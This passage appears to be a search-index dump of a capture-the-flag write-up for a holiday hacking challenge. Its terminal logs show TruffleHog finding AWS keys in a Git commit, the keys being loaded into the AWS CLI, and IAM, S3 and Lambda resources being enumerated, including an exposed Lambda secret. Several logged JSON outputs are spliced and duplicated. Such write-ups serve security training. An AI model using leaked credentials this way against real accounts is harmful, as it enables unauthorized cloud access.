get-caller-identity An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid. elf@3298c5df39c5:~$ vim .aws/config elf@3298c5df39c5:~$ vim .aws/credentials elf@3298c5df39c5:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@3298c5df39c5:~$","title":"Terminal answers"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html","text":"Recover the Cloud Ring 4.2 Find the Next Objective Talk to Jill Underpole for the next objective. Solve","title":"4.2 Find the Next Objective"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html#recover-the-cloud-ring","text":"","title":"Recover the Cloud Ring"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html#42-find-the-next-objective","text":"Talk to Jill Underpole for the next objective.","title":"4.2 Find the Next Objective"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html","text":"Recover the Cloud Ring 4.3 Trufflehog Search Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials? Hint(s) Solve ANSWER: put_policy.py Terminal answers 1.- Inital scan review elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 <-- HERE see this commit ID File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md elf@ef250a6290e8:~$ 2.- Review the rest with no verification flag elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts --no-verification \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 elf@ef250a6290e8:~$ 3.- Clone the repo and read the content file using git commands elf@9ae78a2aedc7:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git elf@9ae78a2aedc7:~$ cd aws_scripts/ elf@ef250a6290e8:~/aws_scripts$ git diff-tree --no-commit-id --name-only -r 106d33e1ffd53eea753c1365eafc6588398279b5 put_policy.py <--Voila! FLAG","title":"4.3 Trufflehog Search"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html#recover-the-cloud-ring","text":"","title":"Recover the Cloud Ring"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html#43-trufflehog-search","text":"Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials?","title":"4.3 Trufflehog Search"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html#solve","text":"ANSWER: put_policy.py","title":"Solve"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html#terminal-answers","text":"1.- Inital scan review elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 <-- HERE see this commit ID File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md elf@ef250a6290e8:~$ 2.- Review the rest with no verification flag elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts --no-verification \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 elf@ef250a6290e8:~$ 3.- Clone the repo and read the content file using git commands elf@9ae78a2aedc7:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git elf@9ae78a2aedc7:~$ cd aws_scripts/ elf@ef250a6290e8:~/aws_scripts$ git diff-tree --no-commit-id --name-only -r 106d33e1ffd53eea753c1365eafc6588398279b5 put_policy.py <--Voila! FLAG","title":"Terminal answers"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html","text":"Recover the Cloud Ring 4.4 Trufflehog Search Talk to Gerty Snowburrow for the next objective. Solve","title":"4.4 Find the Next Objective"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html#recover-the-cloud-ring","text":"","title":"Recover the Cloud Ring"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html#44-trufflehog-search","text":"Talk to Gerty Snowburrow for the next objective.","title":"4.4 Trufflehog Search"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html","text":"Recover the Cloud Ring 4.5 Exploitation via AWS CLI Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge. Hint(s) Solve Terminal answers Note : Continue terminal log from challenge 4.2 Trufflehog Search 4.- Extract the AWS keys from chall Trufflehog Search elf@ef250a6290e8:~/aws_scripts$ git show 106d33e1ffd53eea753c1365eafc6588398279b5:put_policy.py import boto3 import json iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', ) 5.- Quick config aws-cli elf@ef250a6290e8:~/aws_scripts$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: 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 Default region name [None]: us-east-1 Default output format [None]: json elf@ef250a6290e8:~/aws_scripts$ 6.- Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: elf@ef250a6290e8:~/aws_scripts$ aws sts get-caller-identity <- OK { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } 7.- Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. elf@ef250a6290e8:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug <-OK { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false } elf@ef250a6290e8:~/aws_scripts$ 8.- Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.htm elf@ef250a6290e8:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY <-OK { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } elf@ef250a6290e8:~/aws_scripts$ 9.- Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html $ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1 <-OK { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } } 10.- Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. $ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } 11.- Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@ef250a6290e8:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms <-OK { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false } elf@ef250a6290e8:~/aws_scripts$ 12.- The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html elf@ef250a6290e8:~/aws_scripts$ aws s3api list-objects --bucket smogmachines3 --query 'Contents[].{Key: Key, Size: Size}' <--OK [ { \"Key\": \"coal-fired-power-station.jpg\", \"Size\": 59312 }, { \"Key\": \"industry-smog.png\", \"Size\": 272528 }, { \"Key\": \"pollution-smoke.jpg\", \"Size\": 33064 }, { \"Key\": \"pollution.jpg\", \"Size\": 81775 }, { \"Key\": \"power-station-smoke.jpg\", \"Size\": 45264 }, { \"Key\": \"smog-power-station.jpg\", \"Size\": 32498 }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"Size\": 5823 } ] elf@ef250a6290e8:~/aws_scripts$ 13.- The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html $ aws lambda list-functions | more <- OK { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] } 14.- Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@ef250a6290e8:~/aws_scripts$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" } elf@ef250a6290e8:~/aws_scripts$ Locate the arg FunctionName $ aws lambda list-functions | grep FunctionName \"FunctionName\": \"smogmachine_lambda\",","title":"4.5 Exploitation via AWS CLI"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html#recover-the-cloud-ring","text":"","title":"Recover the Cloud Ring"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html#45-exploitation-via-aws-cli","text":"Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge.","title":"4.5  Exploitation via AWS CLI"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html#solve","text":"","title":"Solve"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html#terminal-answers","text":"Note : Continue terminal log from challenge 4.2 Trufflehog Search 4.- Extract the AWS keys from chall Trufflehog Search elf@ef250a6290e8:~/aws_scripts$ git show 106d33e1ffd53eea753c1365eafc6588398279b5:put_policy.py import boto3 import json iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', ) 5.- Quick config aws-cli elf@ef250a6290e8:~/aws_scripts$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: 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 Default region name [None]: us-east-1 Default output format [None]: json elf@ef250a6290e8:~/aws_scripts$ 6.- Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: elf@ef250a6290e8:~/aws_scripts$ aws sts get-caller-identity <- OK { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } 7.- Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. elf@ef250a6290e8:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug <-OK { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false } elf@ef250a6290e8:~/aws_scripts$ 8.- Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.htm elf@ef250a6290e8:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY <-OK { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } elf@ef250a6290e8:~/aws_scripts$ 9.- Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html $ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1 <-OK { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } } 10.- Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. $ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } 11.- Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@ef250a6290e8:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms <-OK { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false } elf@ef250a6290e8:~/aws_scripts$ 12.- The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html elf@ef250a6290e8:~/aws_scripts$ aws s3api list-objects --bucket smogmachines3 --query 'Contents[].{Key: Key, Size: Size}' <--OK [ { \"Key\": \"coal-fired-power-station.jpg\", \"Size\": 59312 }, { \"Key\": \"industry-smog.png\", \"Size\": 272528 }, { \"Key\": \"pollution-smoke.jpg\", \"Size\": 33064 }, { \"Key\": \"pollution.jpg\", \"Size\": 81775 }, { \"Key\": \"power-station-smoke.jpg\", \"Size\": 45264 }, { \"Key\": \"smog-power-station.jpg\", \"Size\": 32498 }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"Size\": 5823 } ] elf@ef250a6290e8:~/aws_scripts$ 13.- The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html $ aws lambda list-functions | more <- OK { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": 